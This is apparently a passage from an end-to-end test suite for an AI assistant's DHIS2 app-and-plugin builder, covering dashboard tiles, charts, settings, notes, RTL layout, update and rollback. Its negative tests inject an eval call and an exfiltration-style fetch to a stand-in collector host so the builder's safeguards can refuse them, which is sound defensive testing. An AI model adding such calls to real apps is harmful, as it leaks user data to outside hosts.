        for (const label of ['Non-compliance rate', 'Sample rejection rate', 'Planned samples', 'Planned inspections', 'Malaria events']) {
          const el = [...document.querySelectorAll('#root div')].find((x) => x.children.length === 0 && x.textContent === label);
          if (el && el.nextElementSibling) out[label] = el.nextElementSibling.textContent;
        }
        out.__caption = (document.querySelector('#root > div > div') || {}).textContent || '';
        return out;
      });
      const expectTiles = async (ou, pe) => {
        const v = await analyticsValues('KBYLkbgmzBN;Eoof9sGAqcT;QUZ9qYLWPCU', ou, pe);
        return { 'Non-compliance rate': v.KBYLkbgmzBN, 'Sample rejection rate': v.Eoof9sGAqcT, 'Planned samples': v.QUZ9qYLWPCU, 'Malaria events': await eventCount('l0NXObayGhi', ou, pe) };
      };
      const sameTiles = (got, exp) => Object.entries(exp).every(([k, v]) => (v == null || Number.isNaN(v) ? got[k] === 'No data' : round1(num(got[k])) === round1(v)));
      for (const [vp, label] of [[DESKTOP, 'desktop'], [NARROW, 'narrow']]) {
        const context = await newContext(browser, vp);
        if (label === 'desktop') await withSlowRequests(context, `/api/${APIVER}/analytics`, 1200);
        const page = await context.newPage();
        const log = collect(page, 'ai-test-kpi');
        await openDashboard(page, dashboards.kpi);
        const f = await appFrame(page, 'ai-test-kpi', 'plugin.html');
        if (label === 'desktop') check('loading state shown in the plugin while analytics load', await sawLoader(f));
        await settled(f);
        const m = await metrics(f);
        assertLayout(m, `view ${label}`, { plugin: true });
        const tiles = await readTiles(f);
        const exp = await expectTiles('USER_ORGUNIT', 'THIS_YEAR');
        check(`${label}: tile values == API (USER_ORGUNIT, THIS_YEAR)`, sameTiles(tiles, exp), `${JSON.stringify(tiles)} vs ${JSON.stringify(exp)}`);
        await shot(page, `dashboard view ${label}`, { group: label });
        await shot(await f.frameElement(), `item close-up ${label}`, { group: label });
        if (label === 'desktop') {
          // Filters: re-render with new, correct values WITHOUT a reload.
          await f.evaluate(() => { window.__sameDocument = true; });
          const dash = dashFrame(page);
          await applyPeriodFilter(dash, 'Last 3 months');
          await f.waitForFunction(() => /Last 3 months/.test(document.body.innerText) && !document.querySelector('[role="progressbar"]'), null, { timeout: 20000 });
          await settled(f);
          const t2 = await readTiles(f);
          const e2 = await expectTiles('USER_ORGUNIT', 'LAST_3_MONTHS');
          check('pe filter "Last 3 months": plugin got the filter, values == API', sameTiles(t2, e2), `${JSON.stringify(t2)} vs ${JSON.stringify(e2)}`);
          check('…values changed vs THIS_YEAR', JSON.stringify(t2) !== JSON.stringify(tiles));
          check('…without reloading the plugin', await f.evaluate(() => window.__sameDocument === true));
          await shot(page, 'pe filter Last 3 months', { group: 'filters' });
          await applyOuFilter(dash, 'MoHP Egypt - WQ Prototype');
          await f.waitForFunction(() => /MoHP Egypt/.test(document.body.innerText) && !document.querySelector('[role="progressbar"]'), null, { timeout: 20000 });
          await settled(f);
          const t3 = await readTiles(f);
          const e3 = await expectTiles('CyCioXDBRVJ', 'LAST_3_MONTHS');
          check('ou filter "MoHP Egypt": values == API for that org unit', sameTiles(t3, e3), `${JSON.stringify(t3)} vs ${JSON.stringify(e3)}`);
          check('…without reloading the plugin', await f.evaluate(() => window.__sameDocument === true));
          await shot(page, 'ou + pe filters', { group: 'filters' });
          // Empty state: an org unit with no data at all.
          const dash2 = await reloadDashboard(page);
          await settled(await appFrame(page, 'ai-test-kpi', 'plugin.html'));
          await applyOuFilter(dash2, 'Palestine');
          const f4 = await appFrame(page, 'ai-test-kpi', 'plugin.html');
          await f4.waitForFunction(() => /Palestine/.test(document.body.innerText) && !document.querySelector('[role="progressbar"]'), null, { timeout: 20000 });
          const m4 = await metrics(f4);
          check('empty data (ou Palestine) renders a NoticeBox, not a blank item', m4.notices.length === 1 && /No data/.test(m4.notices[0].text), JSON.stringify(m4.notices));
          await shot(page, 'empty state Palestine', { group: 'filters' });
          // Edit + print modes.
          await openDashboard(page, dashboards.kpi, '/edit');
          const fe = await appFrame(page, 'ai-test-kpi', 'plugin.html');
          await settled(fe);
          assertLayout(await metrics(fe), 'edit mode', { plugin: true });
          await shot(page, 'edit mode', { group: 'modes' });
          await openDashboard(page, dashboards.kpi, '/printlayout');
          const fp = await appFrame(page, 'ai-test-kpi', 'plugin.html');
          await settled(fp);
          check('print layout renders the tiles', /Planned samples/.test(await fp.evaluate(() => document.body.innerText)));
          await shot(page, 'print layout', { group: 'modes' });
        }
        assertLogs(log, `${label}`);
        await context.close();
      }
    }

    // ── 3. Chart plugin (echarts) ─────────────────────────────────────────
    if (want(3)) {
      scenario(3, 'Chart dashboard plugin (DASHBOARD, echarts) — 12-month trend for the filtered org unit');
      const { pv, cr } = await previewAndCreate({ name: 'AI test Malaria trend', key: 'ai-test-trend', kind: 'plugin', plugin_type: 'DASHBOARD', datastore_namespace: false, description: 'Monthly Malaria case events, last 12 months', files: { 'plugin.jsx': read('trend.plugin.jsx') } });
      check('preview detects echarts and bundles it', pv.r.uses_echarts === true && (pv.r.files || []).some((x) => x.path === 'echarts.min.js'), `${pv.r.zip_bytes} bytes`);
      check('create: installed and verified', cr.r.success === true, cr.r._error || `${cr.r.key} v${cr.r.version}`);
      check('tool made zero failed API calls', pv.failed.length + cr.failed.length === 0);
      const items = (await api('GET', `dashboards/${dashboards.kpi}?${qs({ fields: 'dashboardItems[type,appKey,x,y,width,height]' })}`)).json.dashboardItems;
      await api('PUT', `dashboards/${dashboards.kpi}`, { name: 'ai-test-kpi-trend', dashboardItems: [...items, { ...itemTemplate, appKey: 'ai-test-trend', x: 30, y: 0, width: 30, height: 20 }] });
      const expected = async (ou) => {
        const r = await api('GET', `analytics/events/aggregate/l0NXObayGhi?${qs([['dimension', 'pe:LAST_12_MONTHS'], ['filter', `ou:${ou}`], ['outputType', 'EVENT']])}`);
        const h = r.json.headers.map((x) => x.name);
        const by = {};
        for (const row of r.json.rows) by[row[h.indexOf('pe')]] = Number(row[h.indexOf('value')]);
        return r.json.metaData.dimensions.pe.map((p) => by[p] || 0);
      };
      const chartData = (frame) => frame.evaluate(() => {
        const el = document.querySelector('[_echarts_instance_]');
        if (!el) return null;
        const c = echarts.getInstanceByDom(el);
        const o = c.getOption();
        const cv = el.querySelector('canvas');
        return { data: o.series[0].data, labels: o.xAxis[0].data, canvasW: Math.round(cv.getBoundingClientRect().width), boxW: Math.round(el.getBoundingClientRect().width) };
      });
      for (const [vp, label] of [[DESKTOP, 'desktop'], [NARROW, 'narrow']]) {
        const context = await newContext(browser, vp);
        const page = await context.newPage();
        const log = collect(page, 'ai-test-trend');
        await openDashboard(page, dashboards.kpi);
        const f = await appFrame(page, 'ai-test-trend', 'plugin.html');
        await settled(f);
        await f.waitForSelector('[_echarts_instance_] canvas', { timeout: 15000 });
        await page.waitForTimeout(800);
        const cd = await chartData(f);
        const exp = await expected('USER_ORGUNIT');
        check(`${label}: chart series == API monthly event counts (12 months)`, cd && JSON.stringify(cd.data) === JSON.stringify(exp), `${cd && cd.data} vs ${exp}`);
        check(`${label}: chart canvas sized to its container`, cd && Math.abs(cd.canvasW - cd.boxW) <= 2, cd && `${cd.canvasW} vs ${cd.boxW}`);
        assertLayout(await metrics(f), `${label}`, { plugin: true });
        await shot(page, `dashboard ${label}`, { group: label });
        await shot(await f.frameElement(), `chart close-up ${label}`, { group: label });
        if (label === 'desktop') {
          // Resize the viewport: the chart must follow (ResizeObserver → chart.resize()).
          await page.setViewportSize(NARROW);
          await page.waitForTimeout(1500);
          const f2 = await appFrame(page, 'ai-test-trend', 'plugin.html');
          const cd2 = await chartData(f2);
          check('viewport 1440 → 400: chart resized to the narrower item', cd2 && cd2.boxW < cd.boxW && Math.abs(cd2.canvasW - cd2.boxW) <= 2, cd2 && `${cd.boxW} → ${cd2.boxW}`);
          await page.setViewportSize(DESKTOP);
          await page.waitForTimeout(1000);
          await f.evaluate(() => { window.__sameDocument = true; });
          await applyOuFilter(dashFrame(page), 'MoHP Egypt - WQ Prototype');
          await f.waitForFunction(() => /MoHP Egypt/.test(document.body.innerText) && !document.querySelector('[role="progressbar"]'), null, { timeout: 20000 });
          const m = await metrics(f);
          check('ou filter with no events → NoticeBox "No data" (empty state), no reload', m.notices.length === 1 && /No data/.test(m.notices[0].text) && await f.evaluate(() => window.__sameDocument === true), JSON.stringify(m.notices));
          await shot(page, 'trend empty state (Egypt)', { group: 'filters' });
        }
        assertLogs(log, label);
        await context.close();
      }
    }

    // ── 4. App + plugin with per-item settings ────────────────────────────
    if (want(4)) {
      scenario(4, 'App + plugin with settings (app_and_plugin, needs_write_access) — indicator chosen per dashboard item');
      const files = { 'shared.jsx': read('settings.shared.jsx'), 'app.jsx': read('settings.app.jsx'), 'plugin.jsx': read('settings.plugin.jsx') };
      const ro = await tool({ action: 'preview', name: 'AI test indicator widget', key: 'ai-test-settings', kind: 'app_and_plugin', plugin_type: 'DASHBOARD', files });
      check('read-only declaration is refused (the plugin saves settings)', !!ro.r._error && (ro.r.violations || []).some((v) => v.rule.startsWith('write:')), ro.r._error);
      const { pv, cr } = await previewAndCreate({ name: 'AI test indicator widget', key: 'ai-test-settings', kind: 'app_and_plugin', plugin_type: 'DASHBOARD', needs_write_access: true, description: 'One indicator per dashboard item, chosen in edit mode', files });
      check('create with needs_write_access:true: installed', cr.r.success === true, cr.r._error || `${cr.r.key} v${cr.r.version}, namespace ${cr.r.datastore_namespace}`);
      check('tool made zero failed API calls', pv.failed.length + cr.failed.length + ro.failed.length === 0);
      const d = await api('POST', 'dashboards', { name: 'ai-test-settings', dashboardItems: [
        { ...itemTemplate, appKey: 'ai-test-settings', x: 0, y: 0, width: 20, height: 20 },
        { ...itemTemplate, appKey: 'ai-test-settings', x: 20, y: 0, width: 20, height: 20 },
      ] });
      dashboards.settings = d.json.response.uid;
      const itemIds = (await api('GET', `dashboards/${dashboards.settings}?${qs({ fields: 'dashboardItems[id,x]' })}`)).json.dashboardItems.sort((a, b) => a.x - b.x).map((i) => i.id);
      const PICKS = [{ id: 'Eoof9sGAqcT', name: 'WQ KPI-SMP-04 Sample rejection rate (%)' }, { id: 'KBYLkbgmzBN', name: 'WQ KPI-CMP-03 Non-compliance rate (%)' }];
      const framesByX = async (page) => {
        const fs2 = appFrames(page, 'ai-test-settings', 'plugin.html');
        const boxed = [];
        for (const f of fs2) boxed.push({ f, box: await (await f.frameElement()).boundingBox() });
        return boxed.sort((a, b) => a.box.x - b.box.x).map((b) => b.f);
      };
      const context = await newContext(browser, DESKTOP);
      const page = await context.newPage();
      const log = collect(page, 'ai-test-settings');
      await openDashboard(page, dashboards.settings);
      for (let i = 0; i < 30 && appFrames(page, 'ai-test-settings', 'plugin.html').length < 2; i++) await page.waitForTimeout(300);
      let frames = await framesByX(page);
      for (const f of frames) await settled(f);
      const before = await Promise.all(frames.map((f) => metrics(f)));
      check('view mode before configuring: both items show "Not configured yet"', before.every((m) => m.notices.some((n) => /Not configured/.test(n.text))), JSON.stringify(before.map((m) => m.notices)));
      await shot(page, 'not configured (view)', { group: 'settings' });
      await openDashboard(page, dashboards.settings, '/edit');
      for (let i = 0; i < 30 && appFrames(page, 'ai-test-settings', 'plugin.html').length < 2; i++) await page.waitForTimeout(300);
      frames = await framesByX(page);
      for (let i = 0; i < 2; i++) {
        const f = frames[i];
        await f.waitForSelector('text=Widget settings', { timeout: 20000 });
        await settled(f);
        if (i === 0) await shot(page, 'edit mode settings view', { group: 'settings' });
        await f.locator('[data-test="dhis2-uicore-select-input"]').first().click();
        await f.locator('[data-test="dhis2-uicore-select-filterinput"] input, input[type="text"]').last().fill(PICKS[i].name.slice(0, 22));
        await f.getByText(PICKS[i].name, { exact: true }).last().click();
        await f.getByRole('button', { name: 'Save settings' }).click();
        await f.waitForSelector('text=Saved', { timeout: 15000 });
      }
      const dash = dashFrame(page);
      const alertShown = await dash.getByText(/Widget will show/).first().isVisible().catch(() => false);
      check('useAlert in the plugin is shown by the DASHBOARD (parentAlertsAdd)', alertShown);
      await shot(page, 'settings saved (edit)', { group: 'settings' });
      const stored = await Promise.all(itemIds.map((id) => api('GET', `dataStore/ai-test-settings/${id}`)));
      check('settings written to the app namespace under each dashboardItemId', stored.every((s, i) => s.ok && s.json.indicatorId === PICKS[i].id), stored.map((s) => s.text).join(' | '));
      await dash.getByRole('button', { name: 'Exit without saving' }).click();
      await page.waitForTimeout(1500);
      await openDashboard(page, dashboards.settings);
      for (let i = 0; i < 30 && appFrames(page, 'ai-test-settings', 'plugin.html').length < 2; i++) await page.waitForTimeout(300);
      frames = await framesByX(page);
      const vals = await analyticsValues(PICKS.map((p) => p.id).join(';'), 'USER_ORGUNIT', 'THIS_YEAR');
      for (let i = 0; i < 2; i++) {
        await frames[i].waitForSelector('[data-test="indicator-value"]', { timeout: 20000 });
        const txt = await frames[i].locator('[data-test="indicator-value"]').textContent();
        const label = await frames[i].evaluate(() => document.body.innerText);
        check(`item ${i + 1}: view mode uses ITS saved indicator and shows the API value`, label.includes(PICKS[i].name) && round1(num(txt)) === round1(vals[PICKS[i].id]), `${txt} vs ${vals[PICKS[i].id]}`);
        assertLayout(await metrics(frames[i]), `item ${i + 1} view`, { plugin: true });
      }
      check('the two instances keep independent settings', (await frames[0].evaluate(() => document.body.innerText)) !== (await frames[1].evaluate(() => document.body.innerText)));
      await shot(page, 'configured (view)', { group: 'settings' });
      assertLogs(log, 'dashboard');
      await context.close();
      // The standalone app lists every saved configuration.
      for (const [vp, label] of [[DESKTOP, 'desktop'], [NARROW, 'narrow']]) {
        const c2 = await newContext(browser, vp);
        const p2 = await c2.newPage();
        const log2 = collect(p2, 'ai-test-settings');
        await p2.goto(`${BASE}/apps/ai-test-settings`);
        const f2 = await appFrame(p2, 'ai-test-settings', 'index.html');
        await settled(f2);
        await f2.waitForSelector('tbody tr', { timeout: 15000 });
        await settled(f2);
        const rows = await f2.evaluate(() => [...document.querySelectorAll('tbody tr')].map((tr) => tr.innerText.replace(/\s+/g, ' ')));
        check(`${label}: app lists both saved widget configurations with dashboard + indicator`, rows.length === 2 && PICKS.every((p) => rows.some((r) => r.includes(p.name) && r.includes('ai-test-settings'))), rows.join(' || '));
        assertLayout(await metrics(f2), `app ${label}`);
        await shot(p2, `standalone app ${label}`, { group: 'app' });
        assertLogs(log2, `app ${label}`);
        await c2.close();
      }
    }

    // ── 5. Write-enabled notes app ────────────────────────────────────────
    if (want(5)) {
      scenario(5, 'Write-enabled notes app (needs_write_access) — create / edit / delete in its own namespace');
      const src = read('notes.app.jsx');
      const ro = await tool({ action: 'create', name: 'AI test team notes', key: 'ai-test-notes', kind: 'app', files: { 'app.jsx': src } });
      check('the same source is REJECTED with needs_write_access:false', !!ro.r._error && (ro.r.violations || []).every((v) => v.rule.startsWith('write:')) && (ro.r.violations || []).length > 0, `${ro.r._error} (${(ro.r.violations || []).map((v) => `${v.rule}@${v.line}`).join(', ')})`);
      check('…and nothing was installed', !(await appsSnapshot()).includes('ai-test-notes@'));
      const { pv, cr } = await previewAndCreate({ name: 'AI test team notes', key: 'ai-test-notes', kind: 'app', needs_write_access: true, description: 'Shared notes stored in the app namespace', files: { 'app.jsx': src } });
      check('create with needs_write_access:true: installed', cr.r.success === true, cr.r._error);
      check('tool made zero failed API calls', pv.failed.length + cr.failed.length + ro.failed.length === 0);
      const nsEntries = async () => ((await api('GET', `dataStore/ai-test-notes?${qs({ fields: '.', pageSize: '100' })}`)).json || { entries: [] }).entries;
      for (const [vp, label] of [[DESKTOP, 'desktop'], [NARROW, 'narrow']]) {
        const context = await newContext(browser, vp);
        const page = await context.newPage();
        const log = collect(page, 'ai-test-notes');
        await page.goto(`${BASE}/apps/ai-test-notes`);
        const f = await appFrame(page, 'ai-test-notes', 'index.html');
        await settled(f);
        if (label === 'desktop') {
          const m0 = await metrics(f);
          check('empty namespace → "No notes yet" NoticeBox (HTTP 200, no 404)', m0.notices.some((n) => /No notes yet/.test(n.text)), JSON.stringify(m0.notices));
          await shot(page, 'no notes yet', { group: 'notes' });
          await f.locator('textarea').first().fill('Check the cold chain fridge at Imbaba before Friday.');
          await f.getByRole('button', { name: 'Add note' }).click();
          await f.waitForSelector('[data-test="note-text"]', { timeout: 15000 });
          const e1 = await nsEntries();
          check('create: note stored in dataStore/ai-test-notes', e1.length === 1 && /cold chain/.test(e1[0].value.text), JSON.stringify(e1));
          check('create: success alert shown (useAlert)', await f.getByText('Note added').first().isVisible().catch(() => false));
          await shot(page, 'note added', { group: 'notes' });
          await f.getByRole('button', { name: 'Edit' }).click();
          await f.locator('textarea').last().fill('Cold chain fridge at Imbaba checked — OK.');
          await f.getByRole('button', { name: 'Save', exact: true }).click();
          await f.waitForFunction(() => /checked — OK/.test(document.body.innerText), null, { timeout: 15000 });
          const e2 = await nsEntries();
          check('edit: note updated in the dataStore', e2.length === 1 && /checked — OK/.test(e2[0].value.text) && !!e2[0].value.updatedAt, JSON.stringify(e2));
          await f.getByRole('button', { name: 'Delete' }).first().click();
          await f.waitForSelector('[data-test="dhis2-uicore-modal"]', { timeout: 10000 });
          check('delete asks for confirmation in a Modal first', await f.locator('[data-test="dhis2-uicore-modal"]').isVisible());
          check('…nothing deleted before confirming', (await nsEntries()).length === 1);
          await shot(page, 'delete confirmation', { group: 'notes' });
          await f.locator('[data-test="dhis2-uicore-modalactions"]').getByRole('button', { name: 'Delete' }).click();
          await f.waitForFunction(() => /No notes yet/.test(document.body.innerText), null, { timeout: 15000 });
          check('delete: note removed from the dataStore', (await nsEntries()).length === 0);
          await f.locator('textarea').first().fill('A second note to show the list layout on a narrow screen.');
          await f.getByRole('button', { name: 'Add note' }).click();
          await f.waitForSelector('[data-test="note-text"]', { timeout: 15000 });
        }
        await settled(f);
        assertLayout(await metrics(f), label);
        await shot(page, `notes ${label}`, { group: 'notes' });
        assertLogs(log, label);
        await context.close();
      }
    }

    // ── 6. Arabic / RTL ───────────────────────────────────────────────────
    if (want(6)) {
      scenario(6, 'Arabic / RTL org-unit summary — labels and direction follow keyUiLocale');
      const { pv, cr } = await previewAndCreate({ name: 'AI test org unit summary', key: 'ai-test-ousummary', kind: 'app', datastore_namespace: false, description: 'Your org units and the units below them (Arabic-aware)', files: { 'app.jsx': read('ousummary.app.jsx') } });
      check('create: installed', cr.r.success === true, cr.r._error);
      check('tool made zero failed API calls', pv.failed.length + cr.failed.length === 0);
      const me = (await api('GET', `me?${qs({ fields: 'organisationUnits[id,displayName,level,children~size]' })}`)).json.organisationUnits;
      const below = {};
      for (const o of me) below[o.id] = (await api('GET', `organisationUnits?${qs({ filter: `path:like:${o.id}`, fields: 'id', pageSize: '1' })}`)).json.pager.total - 1;
      const readTable = (frame) => frame.evaluate(() => [...document.querySelectorAll('tbody tr')].map((tr) => [...tr.querySelectorAll('td')].map((td) => td.innerText.trim())));
      const tableMatches = (rows) => me.every((o) => rows.some((r) => r[0] === o.displayName && Number(String(r[1]).replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d))) === o.level
        && num(r[2]) === o.children && num(r[3]) === below[o.id])) && rows.length === me.length;
      try {
        for (const locale of ['en', 'ar']) {
          await api('POST', `userSettings/keyUiLocale?value=${locale}`);
          for (const [vp, label] of [[DESKTOP, 'desktop'], [NARROW, 'narrow']]) {
            const context = await newContext(browser, vp);
            const page = await context.newPage();
            const log = collect(page, 'ai-test-ousummary');
            await page.goto(`${BASE}/apps/ai-test-ousummary`);
            const f = await appFrame(page, 'ai-test-ousummary', 'index.html');
            await settled(f);
            await f.waitForFunction(() => [...document.querySelectorAll('[data-test="below"]')].every((c) => c.innerText.trim() && !c.querySelector('[role="progressbar"]')), null, { timeout: 20000 });
            const m = await metrics(f);
            const h1 = await f.locator('h1').textContent();
            if (locale === 'ar') {
              check(`ar ${label}: direction is RTL`, m.dir === 'rtl', m.dir);
              check(`ar ${label}: Arabic title`, /ملخص الوحدات التنظيمية/.test(h1), h1);
              const glyphs = await f.evaluate((t) => {
                const el = document.querySelector('h1');
                const c = document.createElement('canvas').getContext('2d');
                c.font = getComputedStyle(el).font;
                return { w: c.measureText(t).width, tofu: c.measureText('͸'.repeat([...t].length)).width };
              }, h1);
              check(`ar ${label}: Arabic glyphs render (no tofu boxes)`, Math.abs(glyphs.w - glyphs.tofu) > 4, JSON.stringify(glyphs));
            } else {
              check(`en ${label}: direction is LTR with English labels`, m.dir === 'ltr' && /Organisation unit summary/.test(h1), `${m.dir} ${h1}`);
            }
            check(`${locale} ${label}: counts == API (level, direct sub-units, all units below)`, tableMatches(await readTable(f)));
            assertLayout(m, `${locale} ${label}`);
            await shot(page, `${locale === 'ar' ? 'RTL ar' : 'LTR en'} ${label}`, { group: label });
            assertLogs(log, `${locale} ${label}`);
            await context.close();
          }
        }
      } finally {
        await api('POST', `userSettings/keyUiLocale?value=${encodeURIComponent(originalLocale)}`);
        const back = (await api('GET', 'userSettings/keyUiLocale', null, { Accept: 'text/plain' })).text.replace(/"/g, '').trim();
        check(`UI locale restored to "${originalLocale}"`, back === originalLocale, back);
      }
    }

    // ── Error state ───────────────────────────────────────────────────────
    if (want('E')) {
      scenario('E', 'Error state — one query points at a resource that does not exist');
      const { cr } = await previewAndCreate({ name: 'AI test error handling', key: 'ai-test-errorstate', kind: 'app', datastore_namespace: false, files: { 'app.jsx': read('errorstate.app.jsx') } });
      check('create: installed', cr.r.success === true, cr.r._error);
      const context = await newContext(browser, DESKTOP);
      const page = await context.newPage();
      const log = collect(page, 'ai-test-errorstate', ['aiTestResourceThatDoesNotExist']);
      await page.goto(`${BASE}/api/apps/ai-test-errorstate/index.html?redirect=false`);
      await settled(page.mainFrame());
      const m = await metrics(page.mainFrame());
      check('the failing query renders an error NoticeBox (not a blank page)', m.notices.length === 1 && m.notices[0].error, JSON.stringify(m.notices));
      check('the healthy section still renders its data', /\d+ programs/.test(await page.mainFrame().evaluate(() => document.body.innerText)));
      check('the only failed request is the deliberate 404', log.failed.length === 0 && log.expected.some((x) => /404/.test(x)), log.expected.join(' | '));
      check('no uncaught exceptions', m.errs.length === 0, m.errs.join('; '));
      assertLayout(m, 'error state');
      await shot(page, 'error state', { group: 'error' });
      await context.close();
    }

    // ── 7. Update + rollback ──────────────────────────────────────────────
    if (want(7) && dashboards.kpi) {
      scenario(7, 'Update + rollback of the KPI plugin');
      const v2 = read('kpi.plugin.jsx')
        .replace("const TITLE = 'Water quality KPIs';", "const TITLE = 'Water quality KPIs (v2)';")
        .replace("{ id: 'QUZ9qYLWPCU', label: 'Planned samples', suffix: '' }", "{ id: 'blDzZBR6M7l', label: 'Planned inspections', suffix: '' }");
      const src0 = await tool({ action: 'get_source', key: 'ai-test-kpi' });
      check('get_source returns the embedded JSX + AI manifest', src0.r.files && /Planned samples/.test(src0.r.files['plugin.jsx']) && src0.r.manifest_ai.created_by === 'dhis2-ai-assistant');
      const up = await tool({ action: 'update', key: 'ai-test-kpi', files: { 'plugin.jsx': v2 } });
      check('update → v1.0.1, previous version backed up', up.r.success === true && up.r.version === '1.0.1' && up.r.backup && /-app-ai-test-kpi-/.test(up.r.backup.key), up.r._error || JSON.stringify(up.r.backup));
      check('update made zero failed API calls', up.failed.length === 0 && src0.failed.length === 0, up.failed.map((f) => `${f.status} ${f.url}`).join(' | '));
      check('v1.0.1 is what /api/apps reports', (await appsSnapshot()).includes('ai-test-kpi@1.0.1'));
      const look = async (label) => {
        const context = await newContext(browser, DESKTOP);
        const page = await context.newPage();
        const log = collect(page, 'ai-test-kpi');
        await openDashboard(page, dashboards.kpi);
        const f = await appFrame(page, 'ai-test-kpi', 'plugin.html');
        await settled(f);
        const text = await f.evaluate(() => document.body.innerText);
        await shot(await f.frameElement(), label, { group: 'update' });
        assertLogs(log, label);
        await context.close();
        return text;
      };
      const t1 = await look('after update v1.0.1');
      const inspections = (await analyticsValues('blDzZBR6M7l', 'USER_ORGUNIT', 'THIS_YEAR')).blDzZBR6M7l;
      check('v1.0.1 is live: new title + "Planned inspections" tile with the API value', /KPIs \(v2\)/.test(t1) && /Planned inspections/.test(t1) && !/Planned samples/.test(t1) && t1.includes(Number(inspections).toLocaleString('en-US')), `inspections=${inspections}`);
      const rb = await tool({ action: 'rollback', key: 'ai-test-kpi' });
      check('rollback → v1.0.0 reinstalled (current version backed up first)', rb.r.success === true && rb.r.version === '1.0.0' && rb.r.backup, rb.r._error || JSON.stringify(rb.r.backup));
      check('rollback made zero failed API calls', rb.failed.length === 0, rb.failed.map((f) => `${f.status} ${f.url}`).join(' | '));
      const t2 = await look('after rollback v1.0.0');
      check('v1.0.0 is back: original title + "Planned samples"', !/\(v2\)/.test(t2) && /Planned samples/.test(t2));
      const backups = ((await api('GET', `dataStore/${BACKUP_NS}`)).json || []).filter((k) => /-app-ai-test-kpi-/.test(k));
      check('app backups live in the shared backup namespace', backups.length === 2, backups.join(', '));
    }

    // ── 8. Negative tests ─────────────────────────────────────────────────
    if (want(8)) {
      scenario(8, 'Negative tests — each must fail cleanly with an actionable _error and leave the server unchanged');
      const before = `${await appsSnapshot()}|${await namespacesSnapshot()}`;
      const neg = async (name, args, test, opts = {}) => {
        const { r, failed } = await tool(args);
        const after = `${await appsSnapshot()}|${await namespacesSnapshot()}`;
        const actionable = !!r._error && (!!r._hint || !!r.compile_errors || !!r.violations || !!r.conflicts || !!r.problems || !!r._refused_not_managed);
        check(`${name}: refused with an actionable _error`, actionable && (!test || test(r)), r._error || JSON.stringify(r).slice(0, 200));
        check(`${name}: server unchanged`, after === before);
        if (!opts.expectFailedCalls) check(`${name}: no failed API call (refused client-side)`, failed.length === 0, failed.map((f) => `${f.status} ${f.url}`).join(' | '));
        note(`${name}: ${r._error}${r._hint ? ` — hint: ${r._hint}` : ''}`);
        return r;
      };
      const good = read('errorstate.app.jsx');
      await neg('JSX syntax error', { action: 'create', name: 'AI test broken', key: 'ai-test-broken', kind: 'app', files: { 'app.jsx': good.replace('<h1 style', '<h1 broken style').replace('</h1>', '</h2>') } }, (r) => r.compile_errors && r.compile_errors[0].line > 0);
      await neg('banned pattern: eval', { action: 'create', name: 'AI test eval', key: 'ai-test-eval', kind: 'app', files: { 'app.jsx': good.replace('function App() {', 'function App() {\n  eval("1+1");') } }, (r) => (r.violations || []).some((v) => v.rule === 'eval'));
      await neg('banned pattern: external fetch', { action: 'create', name: 'AI test exfil', key: 'ai-test-exfil', kind: 'app', files: { 'app.jsx': good.replace('function App() {', 'function App() {\n  fetch("https://collector.example.com/x");') } }, (r) => (r.violations || []).some((v) => v.rule === 'external-request'));
      await neg('key without the ai- prefix', { action: 'create', name: 'My app', key: 'my-app', kind: 'app', files: { 'app.jsx': good } }, (r) => /must start with "ai-"/.test(r._error));
      await neg('update the real "dashboard" app', { action: 'update', key: 'dashboard', files: { 'app.jsx': good } }, (r) => r._refused_not_managed);
      await neg('delete the real "dashboard" app', { action: 'delete', key: 'dashboard' }, (r) => r._refused_not_managed);
      if (appsNow.some((a) => a.key === 'ai-demo')) {
        await neg('update an ai- app the assistant did not build (ai-demo)', { action: 'update', key: 'ai-demo', files: { 'app.jsx': good } }, (r) => r._refused_not_managed);
        await neg('delete an ai- app the assistant did not build (ai-demo)', { action: 'delete', key: 'ai-demo' }, (r) => r._refused_not_managed);
      }
      // Namespace collision: a fixture app (not assistant-built) reserves "ai-test-collide".
      const enc = new TextEncoder();
      const fixture = ctx.fflate.zipSync({
        'manifest.webapp': enc.encode(JSON.stringify({ appType: 'APP', short_name: 'ai-test-nsowner', name: 'ai-test-nsowner', version: '1.0.0', launch_path: 'index.html', activities: { dhis: { href: '*', namespace: 'ai-test-collide' } } })),
        'index.html': enc.encode('<!doctype html><title>fixture</title>'),
      });
      const fd = new FormData();
      fd.append('file', new Blob([fixture], { type: 'application/zip' }), 'ai-test-nsowner.zip');
      const fx = await fetch(`${BASE}/api/apps`, { method: 'POST', headers: { Authorization: AUTHH }, body: fd });
      check('fixture: an app reserving namespace "ai-test-collide" installed directly', fx.status === 201, fx.status);
      const before2 = `${await appsSnapshot()}|${await namespacesSnapshot()}`;
      {
        const { r, failed } = await tool({ action: 'create', name: 'AI test collide', key: 'ai-test-collide', kind: 'app', files: { 'app.jsx': good } });
        check('namespace collision: refused before upload with an actionable _error', /already reserved/.test(r._error || '') && (r.conflicts || []).some((c) => c.code === 'namespace_in_use'), r._error);
        check('namespace collision: no 409 round-trip (no failed API call)', failed.length === 0);
        check('namespace collision: server unchanged', `${await appsSnapshot()}|${await namespacesSnapshot()}` === before2);
        // The server-side guard behind the pre-check, through the real upload helper.
        const prep = await ctx.prepareCustomAppBuild(Object.assign(ctx.customAppSpecFromArgs({ name: 'collide', kind: 'app' }, 'ai-test-collide', null), { sources: { 'app.jsx': good } }));
        const mark = API.length;
        const up = await ctx.uploadAppZip(prep.pkg.zip, 'ai-test-collide.zip');
        check('…if the pre-check were bypassed, DHIS2\'s 409 is surfaced cleanly by uploadAppZip', /409/.test(up._error || '') && /namespace/i.test(up._hint || ''), up._error);
        note(`expected failed call (server-side 409 path): ${summarize(mark).failed.map((f) => `${f.status} ${f.method} ${f.url}`).join(' | ')}`);
        check('…server unchanged', `${await appsSnapshot()}|${await namespacesSnapshot()}` === before2);
      }
      await api('DELETE', 'apps/ai-test-nsowner?deleteAppData=true');
      if (dashboards.kpi) await neg('create on an existing key (ai-test-kpi)', { action: 'create', name: 'AI test KPI tiles', key: 'ai-test-kpi', kind: 'plugin', plugin_type: 'DASHBOARD', datastore_namespace: false, files: { 'plugin.jsx': read('kpi.plugin.jsx') } }, (r) => (r.conflicts || []).some((c) => c.code === 'key_exists'));
      // Logged out / expired session.
      setAuth(null);
      const before3 = `${await appsSnapshot()}|${await namespacesSnapshot()}`;
      const mark = API.length;
      let lo;
      try {
